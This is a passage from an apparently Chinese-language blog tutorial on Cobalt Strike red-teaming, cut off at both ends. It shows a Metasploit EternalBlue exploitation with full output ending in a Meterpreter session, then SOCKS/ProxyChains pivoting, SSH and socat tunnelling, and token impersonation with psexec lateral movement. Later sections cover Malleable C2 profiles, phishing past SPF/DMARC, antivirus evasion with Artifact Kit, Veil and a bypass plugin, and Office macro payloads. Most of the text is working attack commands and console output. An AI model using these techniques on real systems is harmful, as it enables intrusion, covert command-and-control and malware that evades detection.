exploit/windows/smb/ms17_010_eternalblueset rhosts 192.168.232.132set payload windows/x64/meterpreter/bind_tcpexploit</code></pre><pre><code class="powershell">msf5 &gt; use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.232.132rhosts =&gt; 192.168.232.132msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/bind_tcppayload =&gt; windows/x64/meterpreter/bind_tcpmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit [*] 192.168.232.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 192.168.232.132:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)[*] 192.168.232.132:445   - Scanned 1 of 1 hosts (100% complete)[*] 192.168.232.132:445 - Connecting to target for exploitation.[+] 192.168.232.132:445 - Connection established for exploitation.[+] 192.168.232.132:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.232.132:445 - CORE raw buffer dump (51 bytes)[*] 192.168.232.132:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2[*] 192.168.232.132:445 - 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition [*] 192.168.232.132:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac[*] 192.168.232.132:445 - 0x00000030  6b 20 31                                         k 1             [+] 192.168.232.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.232.132:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.232.132:445 - Sending all but last fragment of exploit packet[*] 192.168.232.132:445 - Starting non-paged pool grooming[+] 192.168.232.132:445 - Sending SMBv2 buffers[+] 192.168.232.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.232.132:445 - Sending final SMBv2 buffers.[*] 192.168.232.132:445 - Sending last fragment of exploit packet![*] 192.168.232.132:445 - Receiving response from exploit packet[+] 192.168.232.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.232.132:445 - Sending egg to corrupted connection.[*] 192.168.232.132:445 - Triggering free of corrupted buffer.[*] Started bind TCP handler against 192.168.232.132:4444[*] Sending stage (201283 bytes) to 192.168.232.132[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 192.168.175.200:9527) at 2020-09-01 22:13:57 -0400[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=meterpreter &gt; ipconfigInterface 11============Name         : Intel(R) PRO/1000 MT Network ConnectionHardware MAC : 00:0c:29:d3:6c:3dMTU          : 1500IPv4 Address : 192.168.232.132IPv4 Netmask : 255.255.255.0IPv6 Address : fe80::a1ac:3035:cbdf:4872IPv6 Netmask : ffff:ffff:ffff:ffff::</code></pre><h3 id="使用-ProxyChains-进行代理转发"><a href="#使用-ProxyChains-进行代理转发" class="headerlink" title="使用 ProxyChains 进行代理转发"></a>使用 ProxyChains 进行代理转发</h3><p>使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理</p><ol><li>和<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中介绍的一致，开启一个 socks 代理服务</li><li>配置 <code>/etc/proxychains.conf</code> 文件</li><li>运行 <code>proxychains + 待执行命令</code></li></ol><p>接下来继续<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中的演示环境：</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0/24 地址段</p></blockquote><p>1、设置 socks 代理</p><p>首先开启交互模式，之后开启 socks 代理</p><pre><code>sleep 0socks 9527</code></pre><pre><code class="powershell">beacon&gt; sleep 0[*] Tasked beacon to become interactive[+] host called home, sent: 16 bytesbeacon&gt; socks 9527[+] host called home, sent: 16 bytes[+] started SOCKS4a server on: 9527</code></pre><p>2、配置  ProxyChains</p><p>在攻击机上，配置 <code>/etc/proxychains.conf</code> 文件的最后一行，根据当前攻击主机 IP 与设置的 Socks 端口，修改如下：</p><pre><code>socks4 192.168.175.200 9527</code></pre><p>3、开始使用  ProxyChains</p><p>根据<a href="https://teamssix.com/year/200419-150644.html">上一节</a>使用 Metasploit 的扫描可以知道，在 192.168.232.0/24 地址段中存在主机 192.168.232.132 ，接下来使用 nmap 扫描一下常见的端口，这里以 80,443,445,3389 作为演示。</p><pre><code>proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389</code></pre><blockquote><p>-sT：使用 TCP 扫描</p><p>-Pn：不使用 Ping</p><p>-p：指定扫描端口</p><p>注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描</p></blockquote><pre><code class="powershell">&gt; proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389                       [proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.14Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 23:05 EDT[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:80  ...  OK[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:445  ...  OK[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:3389  ...  OK[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:443 &lt;--deniedNmap scan report for 192.168.232.132Host is up (0.19s latency).PORT     STATE  SERVICE80/tcp   open   http443/tcp  closed https445/tcp  open   microsoft-ds3389/tcp open   ms-wbt-serverNmap done: 1 IP address (1 host up) scanned in 14.35 seconds</code></pre><p>通过扫描可以看到目标 80 端口是开放的，接下来使用 curl 作为对比示例。</p><pre><code>curl 192.168.232.132proxychains curl 192.168.232.132</code></pre><pre><code class="powershell">&gt; curl 192.168.232.132curl: (7) Failed to connect to 192.168.232.132 port 80: No route to host&gt; proxychains curl 192.168.232.132[proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  192.168.175.200:9527  ...  192.168.232.132:80  ...  OK&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;……内容太多，此处省略……                 </code></pre><h2 id="2、反向转发"><a href="#2、反向转发" class="headerlink" title="2、反向转发"></a>2、反向转发</h2><p>反向转发顾名思义就是和<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中提到的转发路径相反，之前我们设置的代理是 <code>CS服务端 --&gt; 上线主机 --&gt; 内网主机</code>，反向转发则是 <code>内网主机 --&gt; 上线主机 --&gt; CS服务端</code>。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-1.png"></p><p>继续使用上面的演示环境，首先右击上线主机会话，选择 <code>Pivoting --&gt; Listener</code> ，除了 Name 选项之外，CS 都会自动配置好，这里直接使用默认的配置信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-2.png"></p><p>之后生成一个 Windows 可执行文件，选择上一步生成的监听器，如果目标是 64 位则勾选使用 x64 Payload 的选项。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-3.png"></p><p>之后将该可执行文件在目标主机上执行即可，在现实环境中可以尝试使用钓鱼邮件的方式诱导目标执行。</p><p>当目标执行该文件后，就会发现当前不出网的 192.168.232.132 主机已经上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-4.png"></p><p>有一说一，关于这部分网上大部分教程还是 CS 3.x 版本的教程，而在 4.0 的操作中个人感觉要方便很多。</p><p>网上关于这部分内容的 CS 4.0 的教程真的是少之又少，一开始在参考 3.x 教程的时候踩了很多坑，最后终于某内部知识库发现了一篇关于这部分内容的 4.0 教程，在该教程的参考下才发现居然如此简单。</p><h2 id="3、通过-SSH-开通通道"><a href="#3、通过-SSH-开通通道" class="headerlink" title="3、通过 SSH 开通通道"></a>3、通过 SSH 开通通道</h2><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-1.png"></p><p>1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发</p><pre><code>ssh -D 1080 user@&lt;blue pivot&gt;</code></pre><blockquote><p>该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。</p></blockquote><p>2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发</p><pre><code>socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445</code></pre><blockquote><p>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 <code>,socksport=&lt;port&gt;</code> 指定端口才行。</p></blockquote><p>3、在攻击者控制的主机上运行 beacon，使其上线</p><pre><code>注意需要使用 administrator 权限运行 beacon</code></pre><p>4、在上线的主机上运行以下命令</p><pre><code>make_token [DOMAIN\user] [password]jump psexec_psh &lt;red pivot&gt; [listener]</code></pre><p>整体的流程就是下面这张图一样。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-2.png"></p><p><strong>演示</strong></p><p>我在本地搭建了这样的一个环境。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-3.png"></p><ol><li>首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。</li></ol><pre><code>ssh -D 1080 user@192.168.175.146</code></pre><pre><code class="powershell">&gt; ssh -D 1080 user@192.168.175.146user@192.168.175.146&#39;s password: Last login: Fri Jul 31 20:00:54 2020 from 192.168.175.1user@ubuntu:~$ </code></pre><p>2、在 Linux1 主机上开启 445 端口转发</p><pre><code>socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445</code></pre><p>3、在 Win1 主机上运行以下命令使 Win2 上线</p><pre><code>make_token teamssix\administrator Test123!jump psexec_psh 192.168.175.200 smb</code></pre><pre><code class="powershell">beacon&gt; make_token teamssix\administrator Test123![*] Tasked beacon to create a token for teamssix\administrator[+] host called home, sent: 61 bytes[+] Impersonated WINTEST\Administratorbeacon&gt; jump psexec_psh 192.168.175.200 smb[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_532c) on 192.168.175.200 via Service Control Manager (PSH)[+] host called home, sent: 5886 bytes[+] received output:Started service 4aea3b9 on 192.168.175.200[+] host called home, sent: 204473 bytes[+] established link to child beacon: 192.168.232.132</code></pre><p>4、随后便可以看到通过 SSH 上线的主机</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-4.png"></p><h1 id="0x08-Malleable-C2"><a href="#0x08-Malleable-C2" class="headerlink" title="0x08 Malleable C2"></a>0x08 Malleable C2</h1><h2 id="1、Malleable-命令和控制"><a href="#1、Malleable-命令和控制" class="headerlink" title="1、Malleable 命令和控制"></a>1、Malleable 命令和控制</h2><p>Malleable 是一种针对特定领域的语言，主要用来控制 Cobalt Strike Beacon</p><p>在开启 teamserver 时，在其命令后指定配置文件即可调用，比如：</p><pre><code>./teamserver [ip address] [password] [profile]</code></pre><h2 id="2、设置和使用"><a href="#2、设置和使用" class="headerlink" title="2、设置和使用"></a>2、设置和使用</h2><p><strong>定义事务指标</strong></p><pre><code>http-get &#123;    # 指标&#125;http-post &#123;    # 指标&#125;</code></pre><p><strong>控制客户端和服务端指标</strong></p><pre><code>http-get &#123;    client &#123;        # 指标    &#125;    server &#123;        # 指标    &#125;&#125;</code></pre><p><strong>set  操作</strong></p><p>set 语句是给一个选项赋值的方法，以分号结束。</p><pre><code>set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)&quot;;</code></pre><p>malleable 给了我们很多选项，比如：</p><pre><code>jitter        # 控制 beacon 默认回连的抖动因子maxdns        # 控制最大 DNS 请求，限制最大数量可以使 DNS Beacon 发送数据看起来正常些sleeptime    # 控制 beacon 的全部睡眠时间spawntouriuseragent    # 控制每次发送请求的 useragent</code></pre><p><code>sleeptime</code> 和 <code>jitter</code> 两个选项是很重要的</p><p><strong>添加任意 headers</strong></p><pre><code>header &quot;Accept&quot; &quot;text/html,application/xhtml&quot;;header &quot;Referer&quot; &quot;https://www.google.com&quot;;header &quot;Progma&quot; &quot;no-cache&quot;;header &quot;Cache-Control&quot; &quot;no-cache&quot;;</code></pre><p><strong>其他指标</strong></p><pre><code>header &quot;header&quot; &quot;value&quot;;parameter &quot;key&quot; &quot;value&quot;;</code></pre><p><strong>转换/存储数据</strong></p><pre><code>metadata &#123;    netbios;    append &quot;-.jpg&quot;;    uri-append;&#125;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs23-1.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs23-2.png"></p><h2 id="3、配置语言"><a href="#3、配置语言" class="headerlink" title="3、配置语言"></a>3、配置语言</h2><pre><code>append &quot;string&quot;base64netbiosnetbiosuprepend &quot;string&quot;</code></pre><h2 id="4、测试配置文件"><a href="#4、测试配置文件" class="headerlink" title="4、测试配置文件"></a>4、测试配置文件</h2><p>在GitHub 上有一些配置文件的示例，项目地址：<a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>这一节将使用该项目中的 <code>Malleable-C2-Profiles/APT/havex.profile</code> 配置文件作为示例。</p><p><strong>测试配置文件是否有效</strong></p><p>可以使用 c2lint 工具对配置文件进行测试，以判断配置文件编写的是否有效。</p><p>来到 cobalt strike 目录下，可以看到有一个 c2lint 文件，该文件需要在 Linux 下运行。</p><pre><code>./c2lint [profile]</code></pre><p>在运行的结果中，绿色正常（这里更像青色），黄色告警，红色错误，比如运行 <code>Malleable-C2-Profiles</code> 项目里的 <code>havex.profile</code> 文件。</p><pre><code>./c2lint ./Malleable-C2-Profiles/APT/havex.profile</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-1.png"></p><p>当配置文件存在错误的时候，就会以红色显示出来</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-2.png"></p><p><strong>运行 teamserver</strong></p><pre><code>./teamserver [teamserver_ip] [teamserver_password] [profile]</code></pre><pre><code>&gt; ./teamserver 192.168.12.2 password ./Malleable-C2-Profiles/APT/havex.profile[*] Will use existing X509 certificate and keystore (for SSL)Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true[+] I see you&#39;re into threat replication. ./Malleable-C2-Profiles/APT/havex.profile loaded.[+] Team server is up on 50050</code></pre><p>这里调用的 havex.profile 配置文件，该配置文件里对 cookie 进行了 base64 编码。</p><p>开启 cobalt strike 后，使主机上线，通过 wireshark 抓包可以发现数据包确实符合这些特征。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-3.png"></p><p>关于 Malleable C2 文件的使用，这里只是大概记录了一些，想了解更多关于 Malleable C2 文件的内容或者注意事项等，可以参考 A-TEAM 团队的 CS 4.0 用户手册。</p><h1 id="0x09-免杀"><a href="#0x09-免杀" class="headerlink" title="0x09 免杀"></a>0x09 免杀</h1><p>Cobalt Strike 不是什么工作情况都能胜任的工具，因此就需要我们根据不同的情况去做一些辅助工作。</p><h2 id="1、DKIM、SPF-和-DMARC"><a href="#1、DKIM、SPF-和-DMARC" class="headerlink" title="1、DKIM、SPF 和 DMARC"></a>1、DKIM、SPF 和 DMARC</h2><p>SPF、DKIM、DMARC 都是邮件用于帮助识别垃圾信息的附加组件，那么作为一个攻击者，在发送钓鱼邮件的时候，就需要使自己的邮件能够满足这些组件的标准，或者发送到未配置这些组件的域。</p><p>在理解这些防御标准前，需要先理解如何在因特网上通过 SMTP 发送邮件。</p><p><strong>SMTP</strong></p><p>发送一封邮件的过程大概是下面这个样子，这里以QQ邮箱为例。</p><pre><code>&gt; telnet smtp.qq.com 25HELO teamssixauth loginbase64编码后的邮箱名base64编码后的授权码MAIL FROM: &lt;evil_teamssix@qq.com&gt;RCPT TO: &lt;target_teamssix@qq.com&gt;DATA邮件内容.QUIT</code></pre><p><strong>防御策略</strong></p><h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p>DKIM <code>DomainKeys Identified Mail</code> 域名密钥识别邮件，DKIM 是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件接收方接收邮件时，会通过 DNS 查询获得公钥，验证邮件 DKIM 签名的有效性，从而判断邮件是否被篡改。</p><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>SPF <code>Sender Policy Framework</code> 发送人策略框架，SPF 主要用来防止随意伪造发件人。其做法就是设置一个 SPF 记录，SPF 记录实际上就是 DNS 的 TXT 记录。</p><p>如果邮件服务器收到一封来自 IP 不在 SPF 记录里的邮件则会退信或者标记为垃圾邮件。</p><p>我们可以使用以下命令查看目标的 SPF 记录。</p><pre><code>dig +short TXT target.com</code></pre><pre><code>&gt; dig +short TXT qq.com&quot;v=spf1 include:spf.mail.qq.com -all&quot;</code></pre><p>上面的 <code>include:spf.mail.qq.com</code> 表示引入<code>spf.mail.qq.com</code>域名下的 SPF 记录。</p><pre><code>&gt; dig +short TXT spf-a.mail.qq.com&quot;v=spf1 ip4:203.205.251.0/24 ip4:103.7.29.0/24 ip4:59.36.129.0/24 ip4:113.108.23.0/24 ip4:113.108.11.0/24 ip4:119.147.193.0/24 ip4:119.147.194.0/24 ip4:59.78.209.0/24 ip4:113.96.223.0/24 ip4:183.3.226.0/24 ip4:183.3.255.0/24 ip4:59.36.132.0/24 -all&quot;</code></pre><p>上面的 <code>ip4:203.205.251.0/24 ip4:103.7.29.0/24</code> 表示只允许这个范围内的 IP 发送邮件。</p><h3 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h3><p>DMARC <code>Domain-based Message Authentication, Reporting &amp; Conformance</code> 基于域的消息认证，报告和一致性。</p><p>它用来检查一封电子邮件是否来自所声称的发送者。DMARC 建立在 SPF 和 DKIM 协议上, 并且添加了域名对齐检查和报告发送功能。这样可以改善域名免受钓鱼攻击的保护。</p><p>可以使用下面的命令查看目标的的 DMARC 记录。</p><pre><code>dig +short TXT _dmarc.target.com</code></pre><pre><code>&gt; dig +short TXT _dmarc.qq.com&quot;v=DMARC1; p=none; rua=mailto:mailauth-reports@qq.com&quot;</code></pre><p>也有一些在线网站支持检测 SPF、DKIM、DMARC 的记录，比如 <a href="https://dmarcly.com/tools/">https://dmarcly.com/tools/</a></p><p>关于这些记录查询返回结果的解释可参考文章末的参考链接。</p><p><strong>发送钓鱼邮件的一些注意事项</strong></p><p>1、检测目标是否有 SPF 记录，如果有则可能会被拦截</p><p>2、检测目标 DMARC 记录的 p 选项是否为 reject ，如果有则可能会被拒绝</p><p>3、模板中嵌入的 URL 地址，不要使用 IP 地址，要保证使用完整的 URL地址</p><p>4、邮件的附件中不能附上一些可执行文件，比如 exe 格式的文件，因为一些邮件过滤器可能会将这些可执行文件删除</p><h2 id="2、杀毒软件"><a href="#2、杀毒软件" class="headerlink" title="2、杀毒软件"></a>2、杀毒软件</h2><p>这一节将来看看杀毒软件相关的概念，毕竟知己知彼才能百战不殆，最后会介绍一下常见的免杀方法。</p><p>常规杀毒软件的目的就是发现已知病毒并中止删除它，而作为攻击者则需要对病毒文件进行免杀处理，从而使杀毒软件认为我们的文件是合法文件。</p><p><strong>杀软受到的限制</strong></p><p>1、杀毒软件不能把可疑文件删除或者结束运行，否则用户的正常操作可能就会受到影响，同时也会对杀毒软件公司的声誉、口碑产生影响。</p><p>2、杀毒软件不能占用太多的系统资源，否则用户可能会考虑卸载杀毒软件。</p><p>3、大多数杀毒软件的一个弱点就是只会在浏览器下载文件或者文件被写入磁盘时才会检查这个文件的特征码，也就是说在这种情况下才会检查文件是否是病毒。</p><p><strong>如何工作</strong></p><p>1、在大多数杀毒软件背后都会有一个已知病毒的签名数据库，通过将当前文件的特征码与病毒签名数据库进行比对，如果一致则说明该文件是病毒。</p><p>2、同时一些杀毒软件也会去发现用户的一些可疑行为，而且杀毒软件对这种可疑行为的判定会下比较大的功夫。因为如果误杀，造成的后果可能对用户来说是比较严重的。</p><p>3、一些杀毒软件会在沙箱环境中去运行可疑文件，然后根据该可疑文件的行为判断是否为病毒。</p><h3 id="如何免杀"><a href="#如何免杀" class="headerlink" title="如何免杀"></a>如何免杀</h3><p>首先要判断目标使用了哪款杀毒软件，然后自己在虚拟机中去尝试绕过它。</p><p>其次可以使用 Cobalt Strike 的 Artifact Kit 组件制作免杀可执行文件。Artifact Kit 是一个制作免杀 EXE、DLL 和 Service EXE 的源代码框架，在 Cobalt Strike 的 <code>Help --&gt; Arsenal</code> 处可下载 Artifact Kit。</p><p>Artifact Kit 的工作原理大概如下：</p><p>1、将病毒文件进行混淆处理，使杀毒软件将其判定为可疑文件而不是病毒文件。这种混淆可以逃避那些使用简单字符串搜索来识别恶意代码的杀毒软件。</p><p>2、对病毒文件进行一些处理，以绕过沙箱检测。比如 Artifact Kit 中的 src-common/bypass-pipe.c 会生成可执行文件和DLL，它们通过命名管道为自己提供shellcode。如果防病毒沙箱不能模拟命名管道，它将找不到已知的恶意 shellcode。</p><p>Artifact Kit 的使用步骤大概如下：</p><p>1、下载 Artifact Kit </p><p>2、如果需要的话就修改/混淆病毒文件 </p><p>3、构建</p><p>4、使用 Artifact Kit 加载脚本</p><h3 id="Artifact-Kit"><a href="#Artifact-Kit" class="headerlink" title="Artifact Kit"></a>Artifact Kit</h3><p>首先来看看未进行免杀处理的效果，这里采用 <a href="https://www.virustotal.com/">virustotal</a> 进行检测，发现被 42 个引擎检测到。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-6.png"></p><p>接下来就试试 Artifact Kit 进行免杀的效果，有条件的可以去官网下载支持一下正版。</p><p>当然 Github 上也有人上传了，项目地址：<a href="https://github.com/Cliov/Arsenal">https://github.com/Cliov/Arsenal</a></p><p>这里使用 Artifact Kit 中的 dist-peek 方法进行测试。</p><p>来到 Cobalt Strike 下打开 <code>Cobalt Strike -&gt; Script Manager</code>，Load 加载 <code>/Arsenal/artifact/dist-peek/artifact.cna</code> 插件，之后在 <code>Attacks -&gt; Packages -&gt; Windows Executable</code> 中生成木马文件。</p><p>使用 VT 检测发现仅有 8 个引擎检测到，感觉效果好像还行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-9.png"></p><p>把每个杀软的病毒库升级到最新后，实测可以过腾讯电脑管家、火绒，但 360 安全卫士 、 360 杀毒不行。</p><blockquote><p>说句题外话，至于为什么用了两款 360 的产品，主要就是为了截图好看些。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-10.png"></p><h3 id="Veil-Evasion"><a href="#Veil-Evasion" class="headerlink" title="Veil Evasion"></a>Veil Evasion</h3><p>此外，也可以使用 Veil Evasion 框架，Veil Evasion 的安装也是比较简单的，Veil-Evasion 在 Kali 2020以前是自带的，但 Kali 2020 中是需要独立安装的。在 Kali 中可以直接使用 apt-get 进行安装。</p><pre><code>git config --global http.proxy &#39;socks5://127.0.0.1:1080&#39;git config --global https.proxy &#39;socks5://127.0.0.1:1080&#39;apt-get install veil-evasionveil</code></pre><p>其他系统可以使用 veil-evasion 项目中的介绍进行安装，项目地址：<a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>由于 Veil Evasion 有 200 多 M ，因此建议挂上代理进行下载安装。</p><p>安装完成之后，在 Cobalt Strike 里的 <code>Attacks -&gt; Packages -&gt; Payload Generator</code>  中选择 Veil 输出生成一个 payload.txt 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-1.png"></p><p>随后来到 Kali 下，输入 <code>veil</code> 启动，输入 <code>use Evasion</code> 使用 Evasion 工具，<code>list</code> 查看当前可用的 Payload</p><pre><code>veiluse Evasionlist</code></pre><p>这里使用第 17 个即 <code>go/shellcode_inject/virtual.py</code> Payload 作为示例，因为 go、c 等编译性语言语言相对于 python 等脚本语言来说免杀效果会好些。</p><pre><code>use 17</code></pre><p>之后输入 <code>generate</code>，选择第三项 <code>Custom shellcode string</code> ，粘贴刚生成的 payload.txt 文本内容，输入要生成的 exe 文件名，即可生成一个免杀木马。</p><pre><code>generate3粘贴 payload.txt 内容bypass_go    #生成文件的名称</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-4.png"></p><p>使用 virustotal 查杀了一下生成的 bypass_go.exe，发现被 40 个引擎检测到，不得不说这效果很一般。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-5.png"></p><p>实测可以过360 安全卫士、 360 杀毒，但腾讯电脑管家、火绒不行。</p><blockquote><p>看到 VT 的检测结果后，我还以为四款杀软都能检测到呢，没想到啊。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-11.png"></p><h3 id="免杀插件"><a href="#免杀插件" class="headerlink" title="免杀插件"></a>免杀插件</h3><p>后来又在 GitHub 上发现一款免杀插件，2 个月前更新的，项目地址：<a href="https://github.com/hack2fun/BypassAV">https://github.com/hack2fun/BypassAV</a></p><p>使用方法可以参考项目中的介绍，目前效果感觉还是可以的，在 virustotal 上只被 10 个引擎检测到。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-7.png"></p><p>实测可以过 360 安全卫士、360 杀毒、腾讯电脑管家，但火绒不行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-8.png"></p><p>在测试完成之后，开始体会到为什么要判断目标使用了哪款杀软的目的了，就上面测试的情况来说，每一家都出现未检测到的情况。在实际的环境中，还是要根据目标的具体情况具体分析。</p><blockquote><p>Emm，浏览器首页又被 360 改成 360 导航了。</p><p>另外不得不说一句，从使用的角度来说，火绒是这里面最乖的，没有其他杀毒软件那么多花花肠子。</p></blockquote><p><strong>补充</strong></p><p>进行云查杀的一些情况：</p><p>1、首先判断文件是否为正常文件</p><p>2、如果判断为可疑文件，则把文件的 hash 上传到云上</p><p>3、同时把这个文件标记为可疑文件，而不是正常文件</p><p>因此可以通过修改我们的脚本来使其跳过云查杀，就像是在白名单里的程序一样。</p><h3 id="Java-Applet"><a href="#Java-Applet" class="headerlink" title="Java Applet"></a>Java Applet</h3><p>接下来一起来看看 Cobalt Strike Java Applet 攻击，在 Cobalt Strike 的源码中内置了用于攻击 Java Applet 签名的 Applet 工具。</p><p>使用 Applet 工具的步骤如下：</p><p>1、到 <code>Help -&gt; Arsenal</code></p><p>2、如果需要的话就修改/混淆病毒文件 </p><p>3、使用代码签名证书进行签名</p><p>4、构建</p><p>5、使用 Applet Kit 加载脚本</p><p>大概在 2014 年 7 月，开始有人在钓鱼中使用宏攻击，在几年前，这是一种效果还很不错的攻击方式。</p><h2 id="3、应用白名单"><a href="#3、应用白名单" class="headerlink" title="3、应用白名单"></a>3、应用白名单</h2><p>站在防御者的角度，一个好的防御应该是列出只允许自己运行的应用程序白名单而不允许他人运行。对于攻击者则是使用白名单应用程序将代理放到内存中的方法来进行攻击，Java Applet 攻击就是这样做的。</p><p>一种攻击的方法是直接插入内存进行攻击。Java Applet、Office 宏、CS 下的 PowerShell 命令行都是这样做的。</p><p>一些白名单免杀的资料：</p><p><a href="https://twitter.com/subTee">https://twitter.com/subTee</a></p><p><a href="https://github.com/khr0x40sh/WhiteListEvasion">https://github.com/khr0x40sh/WhiteListEvasion</a></p><h3 id="白名单申请"><a href="#白名单申请" class="headerlink" title="白名单申请"></a>白名单申请</h3><p>Win + R 打开运行窗口，输入 <code>gpedit.msc</code> ，来到 <code>用户配置 -&gt; 管理模板 -&gt; 系统</code> 处，打开 <code>只允许指定的 Windows 程序</code></p><p>在打开的窗口中，勾选<code>已启用</code>，之后点击<code>显示</code>按钮，在其中写入白名单的程序名称后，点击两次确定之后即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-1.png"></p><h2 id="4、宏攻击"><a href="#4、宏攻击" class="headerlink" title="4、宏攻击"></a>4、宏攻击</h2><p>在 Cobalt Strike 客户端上，选择 <code>Packages --&gt; MS Office Macro</code>，指定一个监听器，点击 <code>Generate</code>，之后根据提示的步骤生成一个 Word 文档。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-2.png"></p><p>大体的步骤如下：</p><p>1、打开 Microsoft Word 或者 Excel</p><p>2、来到 <code>视图 --&gt; 宏</code></p><p>3、任意填写一个宏的名称</p><p>4、宏的位置选择为当前文档</p><p>5、点击创建</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-3.png"></p><p>6、在打开的编辑器中，删除掉原来的内容</p><p>7、点击 Cobalt Strike 